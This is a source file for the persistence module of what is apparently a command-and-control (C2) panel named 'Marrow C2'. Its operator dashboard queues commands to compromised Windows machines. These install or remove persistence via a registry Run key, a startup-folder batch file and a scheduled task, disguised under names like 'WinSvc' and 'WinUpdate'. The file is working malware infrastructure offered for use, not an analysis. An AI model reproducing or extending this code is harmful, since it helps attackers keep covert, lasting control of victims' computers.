<?php
// Marrow C2 - Persistence Module
// Status cards with individual method controls
?>
<div id="persist-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Header -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <div class="flex items-center gap-3">
            <span class="text-white font-medium">🔒 Persistence</span>
            <span id="persist-status" class="text-xs px-2 py-0.5 rounded-full bg-gray-700 text-gray-400">Unknown</span>
        </div>
        <button onclick="PERSIST.refresh()" class="px-3 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] rounded-lg text-sm">
            🔄 Check Status
        </button>
    </div>

    <!-- Content -->
    <div class="flex-1 overflow-auto p-6">
        <div class="max-w-3xl mx-auto space-y-6">

            <!-- Overall Status -->
            <div id="persist-overview" class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-6 text-center">
                <div class="text-5xl mb-4">🔒</div>
                <div class="text-gray-400">Click "Check Status" to view persistence methods</div>
            </div>

            <!-- Method Cards -->
            <div id="persist-methods" class="grid grid-cols-3 gap-4 hidden">
                <!-- Registry -->
                <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-5 text-center">
                    <div id="persist-reg-icon"
                        class="w-16 h-16 mx-auto rounded-2xl bg-[#1a1f2e] flex items-center justify-center text-3xl mb-4">
                        📝
                    </div>
                    <h3 class="text-white font-semibold mb-1">Registry Run Key</h3>
                    <p class="text-xs text-gray-500 mb-4">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</p>
                    <div id="persist-reg-status" class="text-sm mb-4 text-gray-400">Checking...</div>
                    <button id="persist-reg-btn" onclick="PERSIST.toggleRegistry()"
                        class="w-full py-2.5 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl font-medium text-sm">
                        Toggle
                    </button>
                </div>

                <!-- Startup Folder -->
                <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-5 text-center">
                    <div id="persist-startup-icon"
                        class="w-16 h-16 mx-auto rounded-2xl bg-[#1a1f2e] flex items-center justify-center text-3xl mb-4">
                        📂
                    </div>
                    <h3 class="text-white font-semibold mb-1">Startup Folder</h3>
                    <p class="text-xs text-gray-500 mb-4">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</p>
                    <div id="persist-startup-status" class="text-sm mb-4 text-gray-400">Checking...</div>
                    <button id="persist-startup-btn" onclick="PERSIST.toggleStartup()"
                        class="w-full py-2.5 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl font-medium text-sm">
                        Toggle
                    </button>
                </div>

                <!-- Scheduled Task -->
                <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-5 text-center">
                    <div id="persist-task-icon"
                        class="w-16 h-16 mx-auto rounded-2xl bg-[#1a1f2e] flex items-center justify-center text-3xl mb-4">
                        ⏰
                    </div>
                    <h3 class="text-white font-semibold mb-1">Scheduled Task</h3>
                    <p class="text-xs text-gray-500 mb-4">Windows Task Scheduler (requires admin)</p>
                    <div id="persist-task-status" class="text-sm mb-4 text-gray-400">Checking...</div>
                    <button id="persist-task-btn" onclick="PERSIST.toggleTask()"
                        class="w-full py-2.5 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-xl font-medium text-sm">
                        Toggle
                    </button>
                </div>
            </div>

            <!-- Quick Actions -->
            <div class="flex gap-4">
                <button onclick="PERSIST.installAll()"
                    class="flex-1 py-4 bg-[#10b981]/10 hover:bg-[#10b981]/20 border border-[#10b981]/30 text-[#10b981] rounded-2xl font-semibold flex items-center justify-center gap-2">
                    ⚡ Install All Methods
                </button>
                <button onclick="PERSIST.removeAll()"
                    class="flex-1 py-4 bg-[#ef4444]/10 hover:bg-[#ef4444]/20 border border-[#ef4444]/30 text-[#ef4444] rounded-2xl font-semibold flex items-center justify-center gap-2">
                    🗑️ Remove All Methods
                </button>
            </div>

            <!-- Info Box -->
            <div class="bg-[#1a1f2e] rounded-2xl p-5">
                <h4 class="text-white font-semibold mb-3 flex items-center gap-2">
                    <span>ℹ️</span> About Persistence
                </h4>
                <div class="text-sm text-gray-400 space-y-2">
                    <p><strong class="text-gray-300">Registry:</strong> Adds entry to run at user login. Most reliable
                        method.</p>
                    <p><strong class="text-gray-300">Startup Folder:</strong> Drops batch file to startup folder. Easy
                        to remove.</p>
                    <p><strong class="text-gray-300">Scheduled Task:</strong> Creates Windows task. Requires admin for
                        highest reliability.</p>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    .persist-active {
        background: rgba(16, 185, 129, 0.1) !important;
        border-color: rgba(16, 185, 129, 0.3) !important;
    }

    .persist-active .persist-icon {
        background: rgba(16, 185, 129, 0.2) !important;
    }
</style>

<script>
    const PERSIST = {
        state: { registry: false, startup: false, task: false },

        refresh() {
            queueCommand('persistence_check');
        },

        render(data) {
            try {
                const state = JSON.parse(data);
                this.state = state;

                document.getElementById('persist-overview').classList.add('hidden');
                document.getElementById('persist-methods').classList.remove('hidden');

                // Update overall status
                const any = state.registry || state.startup || state.task;
                const statusEl = document.getElementById('persist-status');
                if (any) {
                    statusEl.textContent = 'Active';
                    statusEl.className = 'text-xs px-2 py-0.5 rounded-full bg-[#10b981]/20 text-[#10b981]';
                } else {
                    statusEl.textContent = 'Inactive';
                    statusEl.className = 'text-xs px-2 py-0.5 rounded-full bg-[#ef4444]/20 text-[#ef4444]';
                }

                // Update individual methods
                this.updateMethod('reg', state.registry);
                this.updateMethod('startup', state.startup);
                this.updateMethod('task', state.task);

            } catch (e) {
                console.error(e);
            }
        },

        updateMethod(id, active) {
            const icon = document.getElementById(`persist-${id}-icon`);
            const status = document.getElementById(`persist-${id}-status`);
            const btn = document.getElementById(`persist-${id}-btn`);
            const card = icon?.closest('.bg-\\[\\#0f1219\\]');

            if (active) {
                icon.style.background = 'rgba(16, 185, 129, 0.2)';
                status.innerHTML = '<span class="text-[#10b981]">✓ Active</span>';
                btn.textContent = 'Remove';
                btn.className = 'w-full py-2.5 bg-[#ef4444]/10 hover:bg-[#ef4444]/20 text-[#ef4444] rounded-xl font-medium text-sm';
                card.style.borderColor = 'rgba(16, 185, 129, 0.3)';
            } else {
                icon.style.background = '#1a1f2e';
                status.innerHTML = '<span class="text-gray-500">✗ Inactive</span>';
                btn.textContent = 'Install';
                btn.className = 'w-full py-2.5 bg-[#10b981]/10 hover:bg-[#10b981]/20 text-[#10b981] rounded-xl font-medium text-sm';
                card.style.borderColor = '#1e2433';
            }
        },

        toggleRegistry() {
            if (this.state.registry) {
                queueCommand('shell', 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v WinSvc /f');
            } else {
                queueCommand('persistence_install');
            }
            setTimeout(() => this.refresh(), 1500);
        },

        toggleStartup() {
            if (this.state.startup) {
                queueCommand('shell', 'del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.bat"');
            } else {
                queueCommand('persistence_install');
            }
            setTimeout(() => this.refresh(), 1500);
        },

        toggleTask() {
            if (this.state.task) {
                queueCommand('shell', 'schtasks /delete /tn "WinUpdate" /f');
            } else {
                queueCommand('persistence_install');
            }
            setTimeout(() => this.refresh(), 1500);
        },

        installAll() {
            if (!confirm('Install all persistence methods?')) return;
            queueCommand('persistence_install');
            setTimeout(() => this.refresh(), 2000);
        },

        removeAll() {
            if (!confirm('Remove all persistence methods?')) return;
            queueCommand('persistence_remove');
            setTimeout(() => this.refresh(), 2000);
        }
    };
</script>